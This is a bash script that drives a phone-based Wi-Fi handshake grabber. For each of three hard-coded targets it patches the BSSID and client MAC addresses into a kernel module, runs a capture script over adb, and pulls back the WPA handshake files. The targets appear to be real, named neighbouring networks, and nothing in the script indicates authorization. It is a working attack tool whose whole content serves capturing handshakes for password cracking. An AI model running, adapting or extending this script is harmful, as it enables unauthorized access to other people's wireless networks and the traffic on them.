#!/bin/bash
# run_fast_grab.sh - Mac-side orchestrator for fast_grab.sh
# Patches petx11.ko for each target, pushes to phone, runs fast_grab.sh
# Args: [ROUNDS] [CAPTURE_SEC]
set -e

BASEDIR="$(cd "$(dirname "$0")" && pwd)"
ROUNDS="${1:-15}"
CAPTURE_SEC="${2:-15}"
PETX11_ORIG="$BASEDIR/petx11.ko"

# Target list: BSSID SSID FREQ CLIENT1 CLIENT2
declare -a TARGETS=(
    "86:1a:24:58:59:1c|CMCC-Hf9K|2437|08:b4:d2:e7:2b:79|ff:ff:ff:ff:ff:ff"
    "04:67:61:d6:dc:93|不想上班|5200|02:4a:6c:1d:d9:9a|4a:06:85:5f:57:ad"
    "18:f2:2c:77:70:81|阿巴阿巴阿巴5g|2412|6c:c3:6a:bf:da:e3|7c:a7:b0:63:04:58"
)

patch_ko() {
    local bssid_hex=$(echo "$1" | tr -d ':' | tr 'A-F' 'a-f')
    local c1_hex=$(echo "$2" | tr -d ':' | tr 'A-F' 'a-f')
    local c2_hex=$(echo "$3" | tr -d ':' | tr 'A-F' 'a-f')
    local ko="$BASEDIR/petx11_fast.ko"
    cp "$PETX11_ORIG" "$ko"
    python3 -c "
import sys
with open('$ko','rb') as f: d=bytearray(f.read())
for old, new, name in [
    ('8cf0df1f4fc7','$bssid_hex','BSSID'),
    ('dad3a50505d7','$c1_hex','Client1'),
    ('92104b3570e4','$c2_hex','Client2')]:
    ob=bytes.fromhex(old); nb=bytes.fromhex(new)
    i=d.find(ob,1800,1900)
    if i>=0: d[i:i+6]=nb; print(f'  {name}@{i}: {old}->{new}')
with open('$ko','wb') as f: f.write(d)
"
    adb push "$ko" /tmp/petx11.ko >/dev/null
}

echo "============================================"
echo " Fast Grab Multi-Target"
echo " Targets: ${#TARGETS[@]}"
echo " Rounds: $ROUNDS  Capture: ${CAPTURE_SEC}s"
echo "============================================"

adb push "$BASEDIR/fast_grab.sh" /tmp/fast_grab.sh >/dev/null
adb shell 'chmod +x /tmp/fast_grab.sh'

for target in "${TARGETS[@]}"; do
    IFS='|' read -r bssid ssid freq c1 c2 <<< "$target"
    echo ""
    echo "========================================"
    echo " TARGET: $ssid ($bssid) ${freq}MHz"
    echo "========================================"
    echo "  Patching petx11.ko..."
    patch_ko "$bssid" "$c1" "$c2"
    echo "  Running..."
    adb shell "sudo bash /tmp/fast_grab.sh '$bssid' '$ssid' $freq $ROUNDS $CAPTURE_SEC"
    RET=$?
    if [ $RET -eq 0 ]; then
        echo "  [OK] Handshake captured! Pulling..."
        BSSID_LOWER=$(echo "$bssid" | tr -d ':' | tr 'A-F' 'a-f')
        adb pull "/tmp/handshake_fast_${BSSID_LOWER}.pcap" "$BASEDIR/handshake_${ssid}_${BSSID_LOWER}.pcap" 2>/dev/null
    fi
done

echo ""
echo "============================================"
echo " DONE"
echo "============================================"
